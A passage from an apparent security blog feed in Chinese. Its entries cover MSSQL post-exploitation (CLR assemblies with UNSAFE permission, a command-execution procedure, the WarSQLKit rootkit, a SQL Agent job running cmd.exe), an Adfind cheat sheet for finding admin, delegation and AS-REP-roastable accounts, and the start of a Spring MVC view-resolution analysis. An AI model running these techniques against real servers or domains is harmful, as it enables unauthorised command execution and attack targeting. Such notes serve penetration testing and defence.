2017 版本及之后"></a>SQL Server 2017 版本及之后</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_configure <span class="token string">'clr enabled'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span>sp_add_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span> <span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span><span class="token punctuation">;</span> <span class="token comment">-- 将某程序集的SHA512哈希值添加到可信程序集列表中</span></code></pre><h2 id="程序集的导入和创建"><a href="#程序集的导入和创建" class="headerlink" title="程序集的导入和创建"></a>程序集的导入和创建</h2><p>通过十六进制字符串创建程序集</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY clrassem <span class="token keyword">from</span> <span class="token operator">&lt;</span>HEX STRING<span class="token operator">></span> <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span>  <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>  <span class="token keyword">FROM</span> <span class="token number">0x4d5a</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO</code></pre><p>创建存储过程，以从程序集运行代码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> debugrun <span class="token keyword">AS</span> EXTERNAL NAME clrassem<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>runner</code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span><span class="token variable">@cmd</span> NVARCHAR <span class="token punctuation">(</span>MAX<span class="token punctuation">)</span><span class="token keyword">AS</span> EXTERNAL NAME <span class="token punctuation">[</span>CLR<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>StoredProcedures<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token punctuation">[</span>ExecCommand<span class="token punctuation">]</span>go</code></pre><h2 id="利用-CLR-执行系统命令"><a href="#利用-CLR-执行系统命令" class="headerlink" title="利用 CLR 执行系统命令"></a>利用 CLR 执行系统命令</h2><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">exec</span> dbo<span class="token punctuation">.</span>ExecCommand <span class="token string">"whoami /all"</span></code></pre><h2 id="删除存储过程、程序集以及受信任的哈希值"><a href="#删除存储过程、程序集以及受信任的哈希值" class="headerlink" title="删除存储过程、程序集以及受信任的哈希值"></a>删除存储过程、程序集以及受信任的哈希值</h2><h3 id="SQL-Server-2017-之前的版本"><a href="#SQL-Server-2017-之前的版本" class="headerlink" title="SQL Server 2017 之前的版本"></a>SQL Server 2017 之前的版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ALTER</span> <span class="token keyword">DATABASE</span> <span class="token operator">&lt;</span>CONNECTED <span class="token keyword">DATABASE</span><span class="token operator">></span> <span class="token keyword">SET</span> TRUSTWORTHY <span class="token keyword">OFF</span></code></pre><h3 id="SQL-Server-2017-及更高版本"><a href="#SQL-Server-2017-及更高版本" class="headerlink" title="SQL Server 2017 及更高版本"></a>SQL Server 2017 及更高版本</h3><pre class="language-sql" data-language="sql"><code class="language-sql">sp_drop_trusted_assembly <span class="token variable">@hash</span><span class="token operator">=</span><span class="token operator">&lt;</span>SHA512 <span class="token keyword">of</span> DLL<span class="token operator">></span></code></pre><h3 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h3><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">PROCEDURE</span> debugrun<span class="token punctuation">;</span><span class="token keyword">DROP</span> ASSEMBLY clrassem<span class="token punctuation">;</span>sp_configure <span class="token string">'clr strict security'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span>sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span></code></pre><h2 id="WarSQLKit"><a href="#WarSQLKit" class="headerlink" title="WarSQLKit"></a>WarSQLKit</h2><p>WarSQLKit 是一个针对 MSSQL CLR 进行利用的工具，有以下两个版本</p><ul><li>WarSQLKit 是完全版本，内置多种功能。</li><li>WarSQLKitMinimal 是简化版，只能执行命令。</li></ul><p>项目地址：<a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></p><p>导入方式和前面差不多</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 导入</span><span class="token keyword">CREATE</span> ASSEMBLY <span class="token punctuation">[</span>WarSQLKit<span class="token punctuation">]</span>    <span class="token keyword">AUTHORIZATION</span> <span class="token punctuation">[</span>dbo<span class="token punctuation">]</span>    <span class="token keyword">FROM</span> <span class="token number">0x4D5A</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">WITH</span> PERMISSION_SET <span class="token operator">=</span> UNSAFE<span class="token punctuation">;</span>GO<span class="token comment"># 创建</span><span class="token keyword">CREATE</span> <span class="token keyword">PROCEDURE</span> sp_cmdExec<span class="token variable">@Command</span> <span class="token punctuation">[</span>nvarchar<span class="token punctuation">]</span><span class="token punctuation">(</span>max<span class="token punctuation">)</span><span class="token keyword">WITH</span> <span class="token keyword">EXECUTE</span> <span class="token keyword">AS</span> CALLER<span class="token keyword">AS</span>EXTERNAL NAME WarSQLKit<span class="token punctuation">.</span>StoredProcedures<span class="token punctuation">.</span>CmdExecGO</code></pre><p>用法见 README</p><h1 id="SQL-Server-Agent-Job-代理执行计划任务利用"><a href="#SQL-Server-Agent-Job-代理执行计划任务利用" class="headerlink" title="SQL Server Agent Job 代理执行计划任务利用"></a>SQL Server Agent Job 代理执行计划任务利用</h1><p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业</p><p>在 Sql Server 配置管理器，启用 SQL Server 代理，注意 Express 版本 Sql Server 是无法启用的</p><p>创建计划任务</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">USE</span> msdb<span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_job <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> sp_add_jobstep <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">,</span> <span class="token variable">@step_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_name1'</span><span class="token punctuation">,</span> <span class="token variable">@subsystem</span> <span class="token operator">=</span> N<span class="token string">'PowerShell'</span><span class="token punctuation">,</span> <span class="token variable">@command</span> <span class="token operator">=</span> N<span class="token string">'c:\windows\system32\cmd.exe /c whoami >c:\\1.txt'</span><span class="token punctuation">,</span> <span class="token variable">@retry_attempts</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">@retry_interval</span> <span class="token operator">=</span> <span class="token number">5</span> <span class="token punctuation">;</span><span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_add_jobserver <span class="token variable">@job_name</span> <span class="token operator">=</span> N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span> <span class="token keyword">EXEC</span> dbo<span class="token punctuation">.</span>sp_start_job N<span class="token string">'test_powershell_job1'</span><span class="token punctuation">;</span></code></pre><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/9475">https://xz.aliyun.com/t/9475</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> MSSQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Adfind 常用命令</title>
      <link href="/posts/1385ebc.html"/>
      <url>/posts/1385ebc.html</url>
      
        <content type="html"><![CDATA[<h1 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h1><p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="查找受-AD-保护的域中的所有用户"><a href="#查找受-AD-保护的域中的所有用户" class="headerlink" title="查找受 AD 保护的域中的所有用户"></a>查找受 AD 保护的域中的所有用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=person)(samaccountname=*)(admincount=1)"</span> -dn</code></pre><h2 id="查找域中受-AD-保护的所有组"><a href="#查找域中受-AD-保护的所有组" class="headerlink" title="查找域中受 AD 保护的所有组"></a>查找域中受 AD 保护的所有组</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token assign-left variable">DC</span><span class="token operator">=</span>domain,DC<span class="token operator">=</span>com -f <span class="token string">"&amp;(objectcategory=group)(admincount=1)"</span> -dn</code></pre><h2 id="查看域管账户"><a href="#查看域管账户" class="headerlink" title="查看域管账户"></a>查看域管账户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind -default -f <span class="token string">"(&amp;(|(&amp;(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))"</span> -dn</code></pre><h2 id="列出域控制器名称"><a href="#列出域控制器名称" class="headerlink" title="列出域控制器名称"></a>列出域控制器名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc dclist</code></pre><h2 id="查看域控版本"><a href="#查看域控版本" class="headerlink" title="查看域控版本"></a>查看域控版本</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -schema -s base objectversion</code></pre><h2 id="查看域内在线的计算机"><a href="#查看域内在线的计算机" class="headerlink" title="查看域内在线的计算机"></a>查看域内在线的计算机</h2><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -sc computers_active name operatingSystem</code></pre><h2 id="查看域内-GPO-信息"><a href="#查看域内-GPO-信息" class="headerlink" title="查看域内 GPO 信息"></a>查看域内 GPO 信息</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc gpodmp</code></pre><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h3 id="查询用户"><a href="#查询用户" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h3 id="查询主机"><a href="#查询主机" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> cn distinguishedName</code></pre><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="查询用户-1"><a href="#查询用户-1" class="headerlink" title="查询用户"></a>查询用户</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h3 id="查询主机-1"><a href="#查询主机-1" class="headerlink" title="查询主机"></a>查询主机</h3><pre class="language-bash" data-language="bash"><code class="language-bash">AdFind.exe -b <span class="token string">"DC=merak,DC=local"</span> -f <span class="token string">"(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))"</span> cn distinguishedName msds-allowedtodelegateto</code></pre><h2 id="查看域内高权限的-SPN-服务主体名称"><a href="#查看域内高权限的-SPN-服务主体名称" class="headerlink" title="查看域内高权限的 SPN 服务主体名称"></a>查看域内高权限的 SPN 服务主体名称</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"&amp;(servicePrincipalName=*)(admincount=1)"</span> servicePrincipalName</code></pre><h2 id="查看可-AS-REP-Roasting-用户"><a href="#查看可-AS-REP-Roasting-用户" class="headerlink" title="查看可 AS-REP Roasting 用户"></a>查看可 AS-REP Roasting 用户</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -b <span class="token string">"dc=merak,dc=local"</span> -f <span class="token string">"useraccountcontrol:1.2.840.113556.1.4.803:=4194304"</span> -dn</code></pre><h2 id="导出整个域的-ACL"><a href="#导出整个域的-ACL" class="headerlink" title="导出整个域的 ACL"></a>导出整个域的 ACL</h2><pre class="language-bash" data-language="bash"><code class="language-bash">Adfind.exe -sc getacls -sddlfilter <span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">;</span> -recmute</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring MVC 视图解析流程</title>
      <link href="/posts/8860d38d.html"/>
      <url>/posts/8860d38d.html</url>
      
        <content type="html"><![CDATA[<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>这里直接使用 Spring Boot 和 Thymeleaf 快速搭建一个环境</p><p>编写 Controller</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Controller</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">UrlController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"index"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">indexController</span><span class="token punctuation">(</span><span class="token class-name">Model</span> model<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"Zh0um1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>在 <code>resource/templates</code> 目录下创建 <code>index.html</code> 作为模板</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>th</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.thymeleaf.org<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Index Page<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Hello Thymeleaf<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>页面效果</p><p><img src="/posts/8860d38d/Pasted-image-20220918211121.png" alt="Pasted-image-20220918211121.png"></p><h1 id="视图解析过程分析"><a href="#视图解析过程分析" class="headerlink" title="视图解析过程分析"></a>视图解析过程分析</h1><p>我们知道 Spring Boot 的请求会经过 <code>DispatcherServlet#doDispatch</code> 被分发到对应的 Handler 中进行处理，所以直接在这个方法中下断点进行分析</p><h2 id="封装-ModelAndView"><a href="#封装-ModelAndView" class="headerlink" title="封装 ModelAndView"></a>封装 ModelAndView</h2><p>在获取到对应的 handler 后通过 <code>ha.handle</code> 方法得到了 ModeAndView 对象</p><p><img src="/posts/8860d38d/Pasted-image-20220918214704.png" alt="Pasted-image-20220918214704.png"></p><p>一路跟进该方法直到 <code>RequestMappingHandlerAdapter#handleInternal</code> 方法中，可以看到 ModelAndView 对象是通过 <code>invokeHandlerMethod</code> 方法获取到的</p><p><img src="/posts/8860d38d/Pasted-image-20220918215303.png" alt="Pasted-image-20220918215303.png"></p><p>一路跟进到 <code>ServletInvocableHandlerMethod#invokeAndHandle</code> 方法中</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">invokeAndHandle</span><span class="token punctuation">(</span><span class="token class-name">ServletWebRequest</span> webRequest<span class="token punctuation">,</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span>        <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> providedArgs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Object</span> returnValue <span class="token operator">=</span> <span class="token function">invokeForRequest</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> providedArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setResponseStatus</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>returnValue <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isRequestNotModified</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">getResponseStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">||</span> mavContainer<span class="token punctuation">.</span><span class="token function">isRequestHandled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">disableContentCachingIfNecessary</span><span class="token punctuation">(</span>webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>            mavContainer<span class="token punctuation">.</span><span class="token function">setRequestHandled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">hasText</span><span class="token punctuation">(</span><span class="token function">getResponseStatusReason</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        mavContainer<span class="token punctuation">.</span><span class="token function">setRequestHandled</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    mavContainer<span class="token punctuation">.</span><span class="token function">setRequestHandled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">state</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"No return value handlers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>returnValueHandlers<span class="token punctuation">.</span><span class="token function">handleReturnValue</span><span class="token punctuation">(</span>                returnValue<span class="token punctuation">,</span> <span class="token function">getReturnValueType</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">)</span><span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> webRequest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token function">formatErrorForReturnValue</span><span class="token punctuation">(</span>returnValue<span class="token punctuation">)</span><span class="token punctuation">,</span> ex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">throw</span> ex<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>通过 <code>InvocableHandlerMethod#invokeForRequest</code> 方法获取到请求的返回值</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Nullable</span><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invokeForRequest</span><span class="token punctuation">(</span><span class="token class-name">NativeWebRequest</span> request<span class="token punctuation">,</span> <span class="token annotation punctuation">@Nullable</span> <span class="token class-name">ModelAndViewContainer</span> mavContainer<span class="token punctuation">,</span>        <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> providedArgs<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token function">getMethodArgumentValues</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> mavContainer<span class="token punctuation">,</span> providedArgs<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>logger<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        logger<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Arguments: "</span> <span class="token operator">+</span> <span class="token class-name">Arrays</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token function">doInvoke</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>通过 <code>doInvoke</code> 方法反射调用对应的 Controller，获取到方法的返回值 <code>returnValue</code></p><p>值得一提的是这里的 <code>InvocableHandlerMethod</code> 对象示例是在 <code>doDispatch</code> 方法中获取到的 handler 对象的的包装类<del>（应该是这么叫的吧）</del>，也就是有些文章说的<strong>通过 invokeForRequest 函数，根据用户提供的 url，调用相关的 Controller</strong></p><p>随后根据 <code>returnValue</code> 是否为 null 来寻找视图，也就是模板文件，这里返回了 <code>index</code>，所以会通过 <code>handleReturnValue</code> 方法来寻找视图</p><p><img src="/posts/8860d38d/Pasted-image-20220918235304.png" alt="Pasted-image-20220918235304.png"></p><p>在 <code>handleReturnValue</code> 中，通过 <code>selectHandler</code> 方法遍历所有的 <code>returnValueHandlers</code> 来获取合适的 handler</p><p><img src="/posts/8860d38d/Pasted-image-20220918235929.png" alt="Pasted-image-20220918235929.png"></p><p>随后在 <code>handler.handleReturnValue()</code> 根据返回值来确定视图名称</p><p><img src="/posts/8860d38d/Pasted-image-20220919000450.png" alt="Pasted-image-20220919000450.png"></p><p><code>invokeAndHandle</code> 方法完成后来到 <code>RequestMappingHandlerAdapter#getModelAndView</code> 方法中</p><p><img src="/posts/8860d38d/Pasted-image-20220919001831.png" alt="Pasted-image-20220919001831.png"></p><p>从 <code>mavContainer</code> 对象中取出视图名称和数据封装成 <code>ModelAndView</code> 对象返回出去，自此就完成了 <code>ModelAndView</code> 的封装</p><p>简单概括一下就是通过 url 匹配到对应的 Controller，反射调用 Controller 获得返回值，根据返回值类型寻找合适的视图名称，最后把视图名称和数据封装成 ModelAndView 对象</p><h2 id="获取视图"><a href="#获取视图" class="headerlink" title="获取视图"></a>获取视图</h2><p>拿到 ModelAndView 对象进入 <code>DispatcherServlet#processDispatchResult</code> 方法</p><p><img src="/posts/8860d38d/Pasted-image-20220920103933.png" alt="Pasted-image-20220920103933.png"></p><p>在 <code>DispatcherServlet#render</code> 方法中获取到视图解析器并完成最后的渲染</p><p>可以看到当 ModelAndView 对象中的视图名称不为 null 时，通过 <code>DispatcherServlet#resolveViewName</code> 方法获取视图解析器</p><p><img src="/posts/8860d38d/Pasted-image-20220920104200.png" alt="Pasted-image-20220920104200.png"></p><p>获取视图的逻辑很简单，就是通过遍历所有的视图解析器，通过 <code>resolveViewName</code> 方法来解析视图名称对应的视图，解析成功就返回该视图</p><p><img src="/posts/8860d38d/Pasted-image-20220920104848.png" alt="Pasted-image-20220920104848.png"></p><p>这里获取到的 <code>ThymeleafView</code> 视图是从 <code>ContentNegotiatingViewResolver</code> 中返回的，而不是 <code>ThymeleafViewResolver</code>，可以跟进 <code>ContentNegotiatingViewResolver#resolveViewName</code> 看看具体实现</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">View</span> <span class="token function">resolveViewName</span><span class="token punctuation">(</span><span class="token class-name">String</span> viewName<span class="token punctuation">,</span> <span class="token class-name">Locale</span> locale<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">RequestAttributes</span> attrs <span class="token operator">=</span> <span class="token class-name">RequestContextHolder</span><span class="token punctuation">.</span><span class="token function">getRequestAttributes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Assert</span><span class="token punctuation">.</span><span class="token function">state</span><span class="token punctuation">(</span>attrs <span class="token keyword">instanceof</span> <span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">,</span> <span class="token string">"No current ServletRequestAttributes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">MediaType</span><span class="token punctuation">></span></span> requestedMediaTypes <span class="token operator">=</span> <span class="token function">getMediaTypes</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ServletRequestAttributes</span><span class="token punctuation">)</span> attrs<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>requestedMediaTypes <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">View</span><span class="token punctuation">></span></span> candidateViews <span class="token operator">=</span> <span class="token function">getCandidateViews</span><span class="token punctuation">(</span>viewName<span 